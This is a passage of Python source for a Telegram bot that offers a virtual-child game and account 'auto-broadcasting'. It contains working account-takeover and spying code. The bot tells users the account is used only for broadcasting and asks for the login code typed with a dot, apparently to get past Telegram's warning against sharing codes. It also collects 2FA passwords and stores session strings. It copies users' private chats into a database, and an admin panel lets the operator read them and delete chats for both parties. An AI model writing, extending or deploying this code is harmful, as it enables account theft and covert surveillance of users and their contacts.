    """Загружает историю ОДНОГО чата. Возвращает число сохранённых."""
    saved = 0
    try:
        msgs = await client.get_messages(chat_id, limit=limit)
        for m in msgs:
            if not m: continue
            text = m.text or "[📎 медиа]"
            sender_id, sender_name, sender_username = await extract_sender_info(m)
            if sender_id:
                try: save_user_info(sender_id, sender_username, sender_name)
                except: pass
            if save_chat_message(user_id, int(chat_id), sender_id, sender_name, sender_username, text, int(m.id)):
                saved += 1
    except Exception as e:
        logging.warning(f"backfill_one_chat {chat_id}: {e}")
    return saved

async def backfill_dialogs(client, user_id, max_dialogs=200, per_chat=30):
    """Загружает историю из диалогов. Логирует прогресс."""
    loaded_chats, loaded_msgs = 0, 0
    try:
        dialogs = []
        async for dialog in client.iter_dialogs(limit=max_dialogs):
            dialogs.append(dialog)
        logging.info(f"📥 Backfill {user_id}: найдено {len(dialogs)} диалогов")
        for dialog in dialogs:
            try:
                chat_id = int(dialog.id)
                chat_name = dialog.name or "Чат"
                save_user_chat(user_id, chat_id, chat_name)
                loaded_chats += 1
                try:
                    msgs = await client.get_messages(dialog.entity, limit=per_chat)
                except FloodWaitError as e:
                    logging.warning(f"FloodWait {e.seconds}s для {chat_id}")
                    await asyncio.sleep(e.seconds + 1)
                    continue
                except Exception as e:
                    logging.warning(f"get_messages {chat_id}: {e}")
                    continue
                for m in msgs:
                    if not m: continue
                    text = m.text or "[📎 медиа]"
                    sender_id, sender_name, sender_username = await extract_sender_info(m)
                    if sender_id:
                        try: save_user_info(sender_id, sender_username, sender_name)
                        except: pass
                    if save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username, text, int(m.id)):
                        loaded_msgs += 1
                await asyncio.sleep(0.2)
            except Exception as e:
                logging.warning(f"Backfill dialog error: {e}")
        logging.info(f"📥 Backfill {user_id}: {loaded_chats} чатов, {loaded_msgs} сообщений сохранено")
    except Exception as e:
        logging.error(f"backfill_dialogs: {e}")

async def start_telethon_listener(user_id, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)

        # Регистрируем handler ДО старта
        @client.on(events.NewMessage)
        async def handle_message(event):
            try:
                chat_id = normalize_chat_id(event)
                if chat_id is None: return
                text = event.message.text or "[📎 медиа]"
                sender_id, sender_name, sender_username = await extract_sender_info(event.message)
                if sender_id:
                    try: save_user_info(sender_id, sender_username, sender_name)
                    except: pass
                ok = save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username, text, int(event.message.id))
                if ok:
                    logging.debug(f"✅ Msg user={user_id} chat={chat_id} msg={event.message.id}")
                try:
                    chat = await event.get_chat()
                    chat_name = getattr(chat, 'title', None) or getattr(chat, 'first_name', None) or "Чат"
                    save_user_chat(user_id, chat_id, chat_name)
                except: pass
            except Exception as e:
                logging.error(f"❌ NewMessage handler: {e}", exc_info=True)

        await client.start()
        telethon_clients[user_id] = client
        logging.info(f"✅ Telethon запущен для {user_id}")

        # Обновляем список диалогов (быстро)
        try:
            dialogs_count = 0
            async for dialog in client.iter_dialogs(limit=300):
                save_user_chat(user_id, int(dialog.id), dialog.name or "Чат")
                dialogs_count += 1
            logging.info(f"📊 Загружено {dialogs_count} чатов для {user_id}")
        except Exception as e:
            logging.error(f"iter_dialogs: {e}")

        # Фоновый backfill (держим ссылку!)
        task = asyncio.create_task(backfill_dialogs(client, user_id))
        backfill_tasks[user_id] = task

        return client
    except Exception as e:
        logging.error(f"❌ start_telethon_listener {user_id}: {e}", exc_info=True)
        return None

async def restore_all_sessions():
    sessions = get_all_sessions()
    logging.info(f"🔄 Восстанавливаем {len(sessions)} сессий...")
    for user_id, session_str in sessions:
        try:
            await start_telethon_listener(int(user_id), session_str)
        except Exception as e:
            logging.error(f"restore {user_id}: {e}")
        await asyncio.sleep(1)
    logging.info(f"✅ Активных клиентов: {len(telethon_clients)}")

# ==================== КЛАВИАТУРЫ ====================
def get_start_keyboard(user_id):
    buttons = []
    if user_id == ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
    buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
    buttons.append([InlineKeyboardButton(text="🤖 Подключить аккаунт для групп", callback_data="btn_group_auth")])
    buttons.append([InlineKeyboardButton(text="⚡ Как подключить бота", callback_data="btn_how_to_connect")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="admin_add_user")],
        [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
    ])

def get_users_keyboard(page=0):
    users = get_all_users()
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(users))
    for i in range(start_idx, end_idx):
        user_id, username, first_name, date, user_type = users[i]
        name = first_name or username or f"ID:{user_id}"
        display_name = f"{name[:20]}..." if len(name) > 20 else name
        type_icon = "📱" if user_type == "business" else "👤"
        chats_count = len(get_user_chats(user_id))
        online = "🟢" if user_id in telethon_clients else "⚪"
        keyboard.append([InlineKeyboardButton(text=f"{online}{type_icon} {display_name} ({chats_count})", callback_data=f"user_{user_id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users_page_{page-1}"))
    if end_idx < len(users): nav.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"users_page_{page+1}"))
    if nav: keyboard.append(nav)
    keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_user_chats_live_keyboard(user_id, page=0):
    chats = get_user_chats(user_id)
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(chats))
    for i in range(start_idx, end_idx):
        chat_id, chat_name = chats[i]
        display = chat_name[:28] + "…" if len(chat_name) > 28 else chat_name
        keyboard.append([InlineKeyboardButton(text=f"💬 {display}", callback_data=f"opnch_{user_id}_{chat_id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"live_chats_{user_id}_{page-1}"))
    if end_idx < len(chats): nav.append(InlineKeyboardButton(text="➡️", callback_data=f"live_chats_{user_id}_{page+1}"))
    if nav: keyboard.append(nav)
    keyboard.append([InlineKeyboardButton(text="🔙 К пользователю", callback_data=f"user_{user_id}")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_chat_view_keyboard(user_id, chat_id, page, total, per_page=15):
    kb = []
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Старше", callback_data=f"pgchat_{user_id}_{chat_id}_{page-1}"))
    if (page + 1) * per_page < total: nav.append(InlineKeyboardButton(text="➡️ Новее", callback_data=f"pgchat_{user_id}_{chat_id}_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton(text="🔄 Загрузить историю", callback_data=f"bfchat_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🗑️ Удалить этот чат", callback_data=f"askdel_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🔙 К чатам", callback_data=f"live_chats_{user_id}_0")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def format_chat_messages(user_id, chat_id, page=0):
    msgs, total = get_chat_messages(user_id, chat_id, page)
    chats = get_user_chats(user_id)
    chat_name = next((n for cid, n in chats if cid == chat_id), str(chat_id))
    owner_uid = user_id
    owner_name = user_names.get(owner_uid, "Владелец")
    peer_id, peer_name, peer_username = None, None, None
    for sid, sname, suname, _, _ in msgs:
        if sid != owner_uid:
            peer_id, peer_name, peer_username = sid, sname, suname
            break

    def link(uid, name, username=None):
        if not uid: return f"<b>{name or 'неизвестно'}</b>"
        shown = name or "User"
        return f'<a href="tg://user?id={uid}">{shown}</a>' + (f" (@{username})" if username else "")

    header = (
        f"💬 <b>Чат:</b> {chat_name}\n"
        f"👤 Владелец: {link(owner_uid, owner_name)}\n"
        f"👥 Собеседник: {link(peer_id, peer_name, peer_username)}\n"
        f"📊 Сообщений: {total} (стр. {page+1})\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    if not msgs:
        return header + "<i>Сообщений пока нет в БД.\nНажми «🔄 Загрузить историю» ниже.</i>", total
    lines = []
    for sid, sname, suname, text, dt in msgs:
        who = link(sid, sname, suname)
        ts = dt.strftime("%d.%m %H:%M") if dt else ""
        safe = (text or "").replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"[{ts}] {who}:\n{safe}")
    body = "\n\n".join(lines)
    if len(header) + len(body) > 3800:
        body = "…" + body[-(3800 - len(header)):]
    return header + body, total

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    if message.chat.type != "private": return
    uid = message.from_user.id
    save_user_info(uid, message.from_user.username, message.from_user.first_name)
    await message.answer(
        f"👋 Добро пожаловать, {get_user_mention(uid, message.from_user.first_name)}!\n\n"
        f"💬 Бот управляет функциями вашего аккаунта.\n\nВыберите раздел:",
        parse_mode="HTML", reply_markup=get_start_keyboard(uid))

@dp.message(F.text.in_(["/admin", ".админ", "админ"]))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

BIRTH_RE = re.compile(r"(?i)^родить\s+(сына|дочь)\s+(.+)$")
CHILD_STATUS_RE = re.compile(r"(?i)^наш\s+(сын|дочь)$")

@dp.message(F.text.regexp(BIRTH_RE))
async def cmd_give_birth(message: Message):
    m = BIRTH_RE.match(message.text.strip())
    if not m:
        await message.answer("❌ Формат: родить сына Имя / родить дочь Имя"); return
    gender = "m" if m.group(1).lower() == "сына" else "f"
    name = m.group(2).strip()[:32]
    if get_alive_child(message.from_user.id):
        await message.answer("У тебя уже есть ребёнок."); return
    child = create_child(message.from_user.id, name, gender)
    if not child:
        await message.answer("❌ Не получилось, попробуй позже."); return
    await message.answer(birth_rules_text(child["name"], child["gender"], child["birth_date"]))

@dp.message(F.text.regexp(CHILD_STATUS_RE))
async def cmd_child_status(message: Message):
    child = get_alive_child(message.from_user.id)
    if not child:
        await message.answer("У тебя пока нет ребёнка. Напиши: родить сына Имя / родить дочь Имя"); return
    await message.answer(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))

@dp.callback_query(F.data.startswith("child_"))
async def cb_child_action(callback: CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]; child_id = int(parts[2])
    child = get_alive_child(callback.from_user.id)
    if not child or child["id"] != child_id:
        await callback.answer("Ребёнок не найден или уже умер 💀", show_alert=True); return
    if action == "heal":
        update_child_field(child_id, "health", child["health"] + 25)
        await callback.answer("💊 Полечили!")
    elif action in NEEDS:
        update_child_field(child_id, action, child[action] + RESTORE_AMOUNT[action])
        await callback.answer("✅ Готово!")
    else:
        await callback.answer(); return
    child = get_alive_child(callback.from_user.id)
    await callback.message.edit_text(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))

# ==================== ЗАДАЧИ РЕБЁНКА ====================
async def child_decay_loop():
    while True:
        await asyncio.sleep(TICK_MINUTES * 60)
        try:
            for child in get_all_alive_children_full():
                old = {k: child[k] for k in NEEDS}
                new_values = {}; critical = 0; reminders = []
                for key in NEEDS:
                    new_val = max(0, old[key] - DECAY_PER_TICK[key])
                    new_values[key] = new_val
                    if new_val <= REMINDER_THRESHOLD:
                        critical += 1
                        if old[key] > REMINDER_THRESHOLD: reminders.append(key)
                if critical > 0:
                    new_health = child["health"] - HEALTH_DECAY_IF_CRITICAL * critical
                else:
                    new_health = child["health"] + HEALTH_REGEN_IF_OK
                new_health = max(0, min(100, new_health))
                if new_health <= 0:
                    kill_child(child["id"])
                    gw = "Сын" if child["gender"] == "m" else "Дочь"
                    dw = "умер" if child["gender"] == "m" else "умерла"
                    try:
                        await bot.send_message(child["owner_id"], f"💀 {gw} {child['name']} {dw}. Это необратимо.")
                    except: pass
                    continue
                update_child_full(child["id"], new_health, new_values)
                for key in reminders:
                    try:
                        await bot.send_message(child["owner_id"], f"{child['name']}: {REMINDER_PHRASES[key]}",
                                               reply_markup=child_action_keyboard(child["id"], highlight=key))
                    except: pass
        except Exception as e:
            logging.error(f"child_decay_loop: {e}")

async def child_birthday_loop():
    while True:
        await asyncio.sleep(24 * 60 * 60)
        try:
            for child in get_all_alive_children_full():
                years, _ = get_game_age(child["birth_date"])
                bd = child["birth_date"]
                today = datetime.now(timezone.utc).date()
                if isinstance(bd, datetime): bd = bd.date()
                if bd.day == today.day and bd.month == today.month and years > child["last_birthday_year"] and years > 0:
                    set_last_birthday_year(child["id"], years)
                    gw = "Сыну" if child["gender"] == "m" else "Дочери"
                    try:
                        await bot.send_message(child["owner_id"], f"🎂 {gw} {child['name']} сегодня {years} лет!")
                    except: pass
        except Exception as e:
            logging.error(f"child_birthday_loop: {e}")

# ==================== АВТОРИЗАЦИЯ ====================
@dp.callback_query(F.data == "btn_group_auth")
async def group_auth(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if get_session(callback.from_user.id):
        await callback.message.answer("✅ Аккаунт уже подключен!"); return
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True)
    await callback.message.answer(
        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n\n"
        "📱 <b>Введите номер телефона</b>\n\n"
        "Формат: <code>79123456789</code>",
        parse_mode="HTML", reply_markup=keyboard)
    await state.set_state(AuthState.waiting_for_phone)

@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
    try:
        if message.contact:
            phone = message.contact.phone_number
        elif message.text:
            phone = re.sub(r'[^\d+]', '', message.text.strip())
            if phone.startswith('8') and len(phone) == 11: phone = '+7' + phone[1:]
            elif not phone.startswith('+'): phone = '+' + phone
        else:
            await message.answer("❌ Отправь номер"); return
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        await state.update_data(phone=phone, client=client)
        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]])
        await message.answer(
            f"📱 <b>Код отправлен!</b>\nНомер: <code>{phone}</code>\n\n"
            f"⚠️ Введи код с точкой внутри.\nНапример: <code>56.785</code>",
            parse_mode="HTML", reply_markup=view_code_kb)
        await state.set_state(AuthState.waiting_for_code)
    except FloodWaitError as e:
        await message.answer(f"⏳ Подожди {e.seconds} сек"); await state.clear()
    except Exception as e:
        logging.error(f"process_phone: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
async def process_code(message: Message, state: FSMContext):
    code_raw = message.text.strip()
    code = code_raw.replace('.', '')
    if not code.isdigit():
        await message.answer("❌ Неверный формат. Например: <code>56.785</code>", parse_mode="HTML"); return
    data = await state.get_data()
    phone = data.get("phone"); client = data.get("client")
    if not phone or not client:
        await message.answer("❌ Данные устарели"); await state.clear(); return
    await message.answer("🔄 Проверка...")
    try:
        await client.sign_in(phone=phone, code=code)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, final_session)
        try: await client.disconnect()
        except: pass
        await message.answer(
            f"✅ <b>Аккаунт подключён!</b>\n\n{TEXT_COMMANDS_HELP}",
            parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except SessionPasswordNeededError:
        await message.answer("🔐 Введи пароль 2FA:")
        await state.set_state(AuthState.waiting_for_2fa)
    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
        await message.answer("❌ Неверный код. Попробуй снова с точкой.")
    except Exception as e:
        logging.error(f"process_code: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
async def process_2fa(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data.get("client"); phone = data.get("phone")
    if not client or not phone:
        await message.answer("❌ Данные устарели"); await state.clear(); return
    try:
        await client.sign_in(password=password)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, final_session)
        try: await client.disconnect()
        except: pass
        await message.answer(f"✅ <b>Аккаунт подключён!</b>\n\n{TEXT_COMMANDS_HELP}",
                             parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {str(e)}")

@dp.message(Command("disconnect"))
async def cmd_disconnect(message: Message):
    if message.chat.type != "private":
        await message.answer("❌ Только в личке"); return
    user_id = message.from_user.id
    if not get_session(user_id):
        await message.answer("❌ Нет активной сессии"); return
    delete_session(user_id)
    if user_id in telethon_clients:
        try: await telethon_clients[user_id].disconnect()
        except: pass
        del telethon_clients[user_id]
    delete_all_user_chats(user_id)
    delete_business_account(user_id)
    await message.answer("✅ <b>Аккаунт отключён!</b>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())

# ==================== CALLBACKS ====================
@dp.callback_query()
async def process_callbacks(callback: CallbackQuery, state: FSMContext):
    data = callback.data
    uid = callback.from_user.id
    if data.startswith("child_"): return
    if data == "btn_features":
        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML"); await callback.answer(); return
    if data == "btn_how_to_connect":
        await callback.answer(); return
    if data == "btn_group_auth":
        await group_auth(callback, state); return
    if data == "btn_admin_panel":
        if uid != ADMIN_ID: await callback.answer(); return
        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return
    if uid != ADMIN_ID:
        await callback.answer(); return

    if data.startswith("live_chats_"):
        parts = data.split("_")
        user_id = int(parts[2]); page = int(parts[3])
        chats = get_user_chats(user_id)
        await callback.message.edit_text(
            f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\nВсего: <code>{len(chats)}</code>",
            reply_markup=get_user_chats_live_keyboard(user_id, page), parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("opnch_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        text, total = format_chat_messages(user_id, chat_id, 0)
        # Если 0 — сразу пытаемся подтянуть историю этого чата
        if total == 0:
            client = telethon_clients.get(user_id)
            if client:
                await callback.answer("⏳ Загружаю историю...", show_alert=False)
                saved = await backfill_one_chat(client, user_id, chat_id, limit=100)
                logging.info(f"Auto-backfill chat={chat_id} saved={saved}")
                text, total = format_chat_messages(user_id, chat_id, 0)
            else:
                await callback.answer("⚠️ Клиент не запущен. Нажми «Поднять клиент».", show_alert=True)
        try:
            await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(user_id, chat_id, 0, total),
                                             parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest:
            pass
        await callback.answer(); return

    if data.startswith("pgchat_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2]); page = int(parts[3])
        text, total = format_chat_messages(user_id, chat_id, page)
        await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(user_id, chat_id, page, total),
                                         parse_mode="HTML", disable_web_page_preview=True)
        await callback.answer(); return

    if data.startswith("bfchat_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess:
                client = await start_telethon_listener(user_id, sess)
        if not client:
            await callback.answer("❌ Клиент не запущен", show_alert=True); return
        await callback.answer("⏳ Загружаю...", show_alert=False)
        saved = await backfill_one_chat(client, user_id, chat_id, limit=200)
        text, total = format_chat_messages(user_id, chat_id, 0)
        try:
            await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(user_id, chat_id, 0, total),
                                             parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest: pass
        await callback.answer(f"✅ Загружено: {saved}", show_alert=False)
        return

    if data.startswith("askdel_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        chats = get_user_chats(user_id)
        chat_name = next((n for cid, n in chats if cid == chat_id), str(chat_id))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Да, удалить только этот чат", callback_data=f"cnfdel_{user_id}_{chat_id}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"opnch_{user_id}_{chat_id}")]])
        await callback.message.edit_text(
            f"⚠️ <b>Удалить чат «{chat_name}»?</b>\n\n"
            f"• У пользователя {get_user_mention(user_id)} этот чат будет удалён со всеми сообщениями.\n"
            f"• Сообщения удалятся и у собеседника (revoke).\n"
            f"• Остальные чаты <b>НЕ</b> тронутся.\n\n"
            f"Действие необратимо.",
            reply_markup=kb, parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("cnfdel_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess: client = await start_telethon_listener(user_id, sess)
        ok = False; err = None
        if not client:
            err = "Клиент не запущен."
        else:
            try:
                try:
                    all_ids = []
                    async for m in client.iter_messages(chat_id, limit=500):
                        all_ids.append(m.id)
                    if all_ids:
                        await client.delete_messages(chat_id, all_ids, revoke=True)
                except Exception as e:
                    logging.warning(f"delete_messages: {e}")
                try:
                    await client.delete_dialog(chat_id, revoke=True)
                except TypeError:
                    await client.delete_dialog(chat_id)
                ok = True
            except Exception as e:
                err = str(e)
                logging.error(f"delete chat {chat_id}: {e}")
        if ok:
            clear_chat_messages(user_id, chat_id)
            delete_user_chat(user_id, chat_id)
            await callback.answer("✅ Чат удалён у обоих!", show_alert=True)
        else:
            await callback.answer(f"❌ {err}", show_alert=True)
        chats = get_user_chats(user_id)
        try:
            await callback.message.edit_text(
                f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\nВсего: <code>{len(chats)}</code>",
                reply_markup=get_user_chats_live_keyboard(user_id, 0), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data == "admin_panel_back":
        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return

    if data == "admin_stats":
        business_users = get_business_accounts()
        manual_users = get_all_users()
        total_manual = len([u for u in manual_users if u[4] == 'manual'])
        total_chats = sum(len(get_user_chats(u[0])) for u in manual_users)
        total_msgs = sum(count_user_messages(u[0]) for u in manual_users)
        await callback.message.edit_text(
            f"📊 <b>СТАТИСТИКА:</b>\n\n"
            f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
            f"• Ручных: <code>{total_manual}</code>\n"
            f"• Всего: <code>{len(manual_users)}</code>\n"
            f"• Чатов: <code>{total_chats}</code>\n"
            f"• Сообщений в БД: <code>{total_msgs}</code>\n"
            f"• Активных клиентов: <code>{len(telethon_clients)}</code>\n"
            f"• Забанено: <code>{len(banned_users)}</code>",
            reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return

    if data == "admin_users":
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n🟢 онлайн / ⚪ оффлайн\n\nВыбери:",
            reply_markup=get_users_keyboard(0), parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("users_page_"):
        page = int(data.split("_")[2])
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n🟢 онлайн / ⚪ оффлайн\n\nВыбери:",
            reply_markup=get_users_keyboard(page), parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("user_"):
        user_id = int(data.split("_")[1])
        chats_count = len(get_user_chats(user_id))
        msgs_count = count_user_messages(user_id)
        online = "🟢 онлайн" if user_id in telethon_clients else "⚪ оффлайн"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")],
            [InlineKeyboardButton(text="🔄 Поднять клиент", callback_data=f"restart_client_{user_id}")],
            [InlineKeyboardButton(text="📥 Загрузить всю историю", callback_data=f"fullbf_{user_id}")],
            [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
            [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]])
        await callback.message.edit_text(
            f"👤 <b>Инфо</b>\n\nID: <code>{user_id}</code>\nИмя: {get_user_mention(user_id)}\n"
            f"Статус: {online}\nЧатов: <code>{chats_count}</code>\nСообщений в БД: <code>{msgs_count}</code>",
            reply_markup=kb, parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("restart_client_"):
        user_id = int(data.split("_")[2])
        await callback.answer("⏳ Поднимаю...", show_alert=False)
        sess = get_session(user_id)
        if not sess:
            await callback.message.answer("❌ Нет сессии."); return
        if user_id in telethon_clients:
            try: await telethon_clients[user_id].disconnect()
            except: pass
            del telethon_clients[user_id]
        new_client = await start_telethon_listener(user_id, sess)
        if new_client:
            await callback.message.answer(f"✅ Клиент <code>{user_id}</code> запущен!", parse_mode="HTML")
        else:
            await callback.message.answer(f"❌ Не удалось.")
        return

    if data.startswith("fullbf_"):
        user_id = int(data.split("_")[1])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess: client = await start_telethon_listener(user_id, sess)
        if not client:
            await callback.answer("❌ Клиент не запущен", show_alert=True); return
        await callback.answer("⏳ Запускаю загрузку...", show_alert=False)
        # Запускаем в фоне
        async def _run():
            try:
                await backfill_dialogs(client, user_id, max_dialogs=300, per_chat=50)
                await callback.message.answer(f"✅ История для <code>{user_id}</code> загружена.", parse_mode="HTML")
            except Exception as e:
                await callback.message.answer(f"❌ {e}")
        asyncio.create_task(_run())
        return

    if data.startswith("delete_user_"):
        user_id = int(data.split("_")[2])
        delete_business_account(user_id)
        await callback.answer("✅ Удалён из списка!", show_alert=True)
        await callback.message.edit_text("👥 <b>ПОЛЬЗОВАТЕЛИ</b>", reply_markup=get_users_keyboard(0), parse_mode="HTML")
        await callback.answer(); return

    if data.startswith("ban_user_"):
        user_id = int(data.split("_")[2])
        if user_id in banned_users:
            set_user_ban(user_id, False); await callback.answer("✅ Разбанен!", show_alert=True)
        else:
            set_user_ban(user_id, True); await callback.answer("🚫 Забанен!", show_alert=True)
        status = "забанен" if user_id in banned_users else "разбанен"
        chats_count = len(get_user_chats(user_id)); msgs_count = count_user_messages(user_id)
        await callback.message.edit_text(
            f"👤 ID: <code>{user_id}</code>\nИмя: {get_user_mention(user_id)}\nСтатус: {status}\n"
            f"Чатов: <code>{chats_count}</code>\nСообщений: <code>{msgs_count}</code>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")],
                [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]]),
            parse_mode="HTML")
        await callback.answer(); return

    if data == "admin_ban_prompt":
        await callback.message.edit_text(
            "🚫 <b>Баны</b>\n\n/ban 123456789 или /ban @username\n/unban 123456789 или /unban @username",
            reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return

    if data == "admin_add_user":
        await callback.message.edit_text(
            "➕ Отправь ID или @username", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")]]),
            parse_mode="HTML")
        await callback.answer(); return

    await callback.answer()

# ==================== АДМИН-КОМАНДЫ ====================
async def resolve_user_id(target_raw):
    target = target_raw.strip()
    if target.startswith("@"):
        return user_usernames.get(target.lstrip("@").lower())
    elif target.isdigit():
        return int(target)
    return None

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, True)
            delete_business_account(target_id)
            await message.answer(f"🚫 {get_user_mention(target_id)} забанен!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Не найден: <code>{arg}</code>", parse_mode="HTML")
    except:
        await message.answer("Формат: /ban 123456789", parse_mode="HTML")

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, False)
            await message.answer(f"✅ {get_user_mention(target_id)} разбанен!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Не найден.", parse_mode="HTML")
    except:
        await message.answer("Формат: /unban 123456789", parse_mode="HTML")

@dp.message(Command("restore"))
async def cmd_restore(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("⏳ Поднимаю все сессии...")
    await restore_all_sessions()
    await message.answer(f"✅ Клиентов: <b>{len(telethon_clients)}</b>", parse_mode="HTML")

@dp.message(Command("debug_user"))
async def cmd_debug_user(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
